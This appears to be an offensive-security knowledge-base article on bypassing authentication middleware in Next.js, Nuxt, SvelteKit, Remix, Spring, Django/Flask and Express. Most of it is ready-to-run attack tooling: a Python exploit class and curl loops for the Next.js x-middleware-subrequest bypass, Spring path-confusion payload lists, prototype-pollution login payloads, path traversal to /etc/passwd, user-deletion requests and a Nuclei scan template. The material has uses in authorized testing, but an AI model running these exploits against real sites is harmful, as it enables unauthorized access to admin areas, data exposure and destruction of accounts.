# KB-33: Framework Middleware Auth Bypass

## Overview

Modern web frameworks rely on middleware/interceptor patterns for authentication enforcement. Implementation flaws in how frameworks process middleware can lead to complete auth bypass. This document covers Next.js, Nuxt.js, SvelteKit, Remix, and advanced Spring/Django/Express middleware bypass chains discovered in 2024-2026.

---

## 1. Next.js Middleware Auth Bypass

### 1.1 CVE-2025-29927 — x-middleware-subrequest Header Bypass

**CVSS**: 9.1 (Critical)
**Affected**: Next.js < 14.2.25, < 15.2.3

Next.js uses `x-middleware-subrequest` internally to prevent infinite middleware recursion. When this header contains the middleware source path, Next.js skips middleware entirely — bypassing all auth checks.

#### Exploitation

```bash
# Detect Next.js
curl -sI https://target.com/ | grep -i "x-powered-by\|x-nextjs\|__next"

# Find protected routes (expect 302/401/403)
curl -s -o /dev/null -w '%{http_code}' https://target.com/admin

# Bypass middleware with header
for path in "middleware" "src/middleware" \
  "middleware:middleware:middleware:middleware:middleware" \
  "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"; do
  status=$(curl -s -o /dev/null -w '%{http_code}' \
    -H "x-middleware-subrequest: ${path}" \
    https://target.com/admin)
  echo "[${status}] x-middleware-subrequest: ${path}"
done
```

#### Python Exploit

```python
import requests
import sys

class NextJSMiddlewareBypass:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()

    def detect_nextjs(self):
        indicators = []
        resp = self.session.get(self.target)
        if 'x-powered-by' in resp.headers and 'Next.js' in resp.headers['x-powered-by']:
            indicators.append(f"X-Powered-By: {resp.headers['x-powered-by']}")
        for path in ['/_next/static/', '/_next/data/', '/__nextjs_original-stack-frame']:
            try:
                r = self.session.get(f"{self.target}{path}", allow_redirects=False)
                if r.status_code != 404:
                    indicators.append(f"Path found: {path} ({r.status_code})")
            except: pass
        return indicators

    def find_protected_routes(self):
        protected = []
        test_paths = ['/admin', '/dashboard', '/api/admin', '/settings',
                      '/profile', '/account', '/internal', '/management',
                      '/api/users', '/api/config', '/api/v1/admin']
        for path in test_paths:
            try:
                resp = self.session.get(f"{self.target}{path}", allow_redirects=False)
                if resp.status_code in [301, 302, 307, 308, 401, 403]:
                    protected.append({'path': path, 'status': resp.status_code,
                                      'location': resp.headers.get('Location', 'N/A')})
            except: pass
        return protected

    def attempt_bypass(self, path):
        bypass_headers = [
            'middleware', 'src/middleware',
            'middleware:middleware:middleware:middleware:middleware',
            'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware',
            'pages/_middleware', 'middleware.ts', 'middleware.js',
        ]
        baseline = self.session.get(f"{self.target}{path}", allow_redirects=False)
        for header_val in bypass_headers:
            resp = self.session.get(f"{self.target}{path}",
                                   headers={'x-middleware-subrequest': header_val},
                                   allow_redirects=False)
            if resp.status_code == 200 and baseline.status_code != 200:
                print(f"[CRITICAL] BYPASS: {path} via x-middleware-subrequest: {header_val}")
                return True
        return False

    def run(self):
        print(f"[*] Target: {self.target}")
        indicators = self.detect_nextjs()
        for i in indicators: print(f"[+] {i}")
        protected = self.find_protected_routes()
        print(f"[+] Found {len(protected)} protected routes")
        for route in protected:
            self.attempt_bypass(route['path'])
```

### 1.2 Next.js Server Actions CSRF Bypass

Server Actions may not validate Origin headers properly, allowing cross-origin invocation:

```bash
# Test Server Action without Origin
curl -X POST https://target.com/action-endpoint \
  -H "Content-Type: text/plain;charset=UTF-8" \
  -H "Next-Action: action-id-here" \
  -d '[{"role":"admin"}]'

# Test with null Origin (sandboxed iframe)
curl -X POST https://target.com/action-endpoint \
  -H "Origin: null" \
  -H "Next-Action: action-id-here" \
  -d '[{"role":"admin"}]'
```

### 1.3 Next.js ISR/SSG Data Route Access

```bash
# Incremental Static Regeneration data routes may expose protected data
curl https://target.com/_next/data/BUILD_ID/admin.json
curl https://target.com/_next/data/BUILD_ID/dashboard.json

# Find BUILD_ID from page source
BUILD_ID=$(curl -s https://target.com | grep -oP '/_next/data/\K[^/]+')
echo "Build ID: $BUILD_ID"
```

---

## 2. Nuxt.js / Vue Router Auth Bypass

### 2.1 Client-Side Route Guard Bypass

Nuxt.js `definePageMeta` middleware runs client-side and can be bypassed:

```python
class NuxtAuthBypass:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def bypass_client_side_guards(self):
        api_paths = ['/api/admin/users', '/api/admin/settings',
                     '/api/_content/query', '/__nuxt_error', '/api/_hub/']
        for path in api_paths:
            resp = requests.get(f"{self.target}{path}")
            if resp.status_code == 200:
                print(f"[+] Accessible without auth: {path}")

    def bypass_via_payload_json(self):
        routes = ['/admin', '/dashboard', '/settings', '/users']
        for route in routes:
            resp = requests.get(f"{self.target}{route}/_payload.json")
            if resp.status_code == 200:
                print(f"[+] Payload leak: {route}/_payload.json")
                print(f"    Data: {resp.text[:300]}")
```

### 2.2 Vue Router Hash Mode Bypass

```javascript
// Hash mode: server never sees #/admin — only client guards protect it
// Bypass in browser console:
// router.beforeEach = (to, from, next) => next()
// store.state.auth.isAuthenticated = true
// store.state.auth.user = { role: 'admin' }
```

---

## 3. SvelteKit Auth Bypass

### 3.1 Server Hook Bypass via __data.json

```bash
# SvelteKit data loading uses __data.json suffix
# If auth is only in +layout.server.ts, direct data calls may bypass it
for page in /admin /dashboard /settings; do
  status=$(curl -s -o /dev/null -w '%{http_code}' "https://target.com${page}/__data.json")
  echo "[${status}] ${page}/__data.json"
done
```

### 3.2 Form Actions Auth Bypass

```bash
# SvelteKit form actions may have separate auth from page loaders
curl -X POST "https://target.com/admin?/deleteUser" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "userId=1"
```

---

## 4. Remix Loader/Action Auth Bypass

### 4.1 Direct Loader Data Access

```bash
# Remix exposes loader data via ?_data= parameter
for route in "routes/admin" "routes/dashboard" "routes/api.users"; do
  status=$(curl -s -o /dev/null -w '%{http_code}' "https://target.com?_data=${route}")
  echo "[${status}] ?_data=${route}"
done
```

### 4.2 Action Function Auth Gap

```bash
# Actions may not inherit loader auth checks
curl -X POST "https://target.com/admin/users" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "_action=delete&userId=1"
```

---

## 5. Spring Security Advanced Bypass

### 5.1 Path Traversal Through Security Filters

```python
class SpringSecurityBypass:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def test_path_bypasses(self, protected_path='/admin'):
        bypasses = [
            f"{protected_path};", f"{protected_path};.css",
            f"{protected_path}%3b", f"/%61dmin", f"/adm%69n",
            f"{protected_path}/.", f"/./admin", f"//admin",
            f"{protected_path}%00", f"{protected_path}%0a",
            f"{protected_path}..;/", '/Admin', '/ADMIN',
            f"/api/..;/admin", f"/admin;jsessionid=x",
        ]
        baseline = requests.get(f"{self.target}{protected_path}", allow_redirects=False)
        for bypass in bypasses:
            resp = requests.get(f"{self.target}{bypass}", allow_redirects=False)
            if resp.status_code == 200 and baseline.status_code != 200:
                print(f"[CRITICAL] Bypass: {bypass}")

    def test_actuator_exposure(self):
        paths = ['/actuator', '/actuator/env', '/actuator/configprops',
                 '/actuator/heapdump', '/actuator/mappings', '/actuator/jolokia']
        for path in paths:
            resp = requests.get(f"{self.target}{path}", allow_redirects=False)
            if resp.status_code == 200:
                print(f"[CRITICAL] Actuator exposed: {path}")
```

### 5.2 Method-Level Security Bypass

```bash
# Spring Security may only protect GET — test all methods
for method in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE PROPFIND; do
  status=$(curl -s -o /dev/null -w '%{http_code}' -X $method https://target.com/admin)
  echo "[$status] $method /admin"
done
```

---

## 6. Django/Flask Advanced Bypass

### 6.1 Django APPEND_SLASH Auth Gap

```bash
# Django redirects /path to /path/ — auth may not protect the redirect
curl -s -o /dev/null -w '%{http_code}' https://target.com/admin    # 302?
curl -s -o /dev/null -w '%{http_code}' https://target.com/admin/   # 302?
curl -s -o /dev/null -w '%{http_code}' https://target.com/admin//  # 200?
```

### 6.2 Flask Static File Path Traversal

```bash
# Flask serves /static/ — test for path traversal
curl https://target.com/static/../../../etc/passwd
curl https://target.com/static/..%2f..%2f..%2fetc/passwd
```

---

## 7. Express.js Middleware Race Conditions

### 7.1 Prototype Pollution Auth Bypass

```python
class ExpressAuthBypass:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def test_prototype_pollution(self):
        payloads = [
            {"__proto__": {"isAdmin": True, "role": "admin", "authenticated": True}},
            {"constructor": {"prototype": {"isAdmin": True}}},
        ]
        for payload in payloads:
            resp = requests.post(f"{self.target}/api/login", json=payload)
            if resp.status_code == 200:
                print(f"[CRITICAL] Prototype pollution: {resp.text[:200]}")

    def test_param_pollution(self):
        resp = requests.get(f"{self.target}/api/users?role=user&role=admin")
        print(f"[*] HPP test: {resp.status_code}")
```

---

## Nuclei Template

```yaml
id: framework-middleware-auth-bypass

info:
  name: Framework Middleware Auth Bypass Multi-Check
  author: auth-agent
  severity: critical
  tags: auth-bypass,middleware,nextjs,nuxt,sveltekit

http:
  - raw:
      - |
        GET {{path}} HTTP/1.1
        Host: {{Hostname}}
      - |
        GET {{path}} HTTP/1.1
        Host: {{Hostname}}
        x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware

    payloads:
      path:
        - /admin
        - /dashboard
        - /api/admin

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 != 200 && status_code_2 == 200"
```

## References

- CVE-2025-29927: Next.js Middleware Bypass (GHSA-f82v-jwr5-cevg)
- CVE-2024-34350: Next.js Server Actions SSRF
- Spring Security Path Matching Bypass (multiple CVEs)
- SvelteKit Auth Hook Documentation
- Remix Loader Security Model
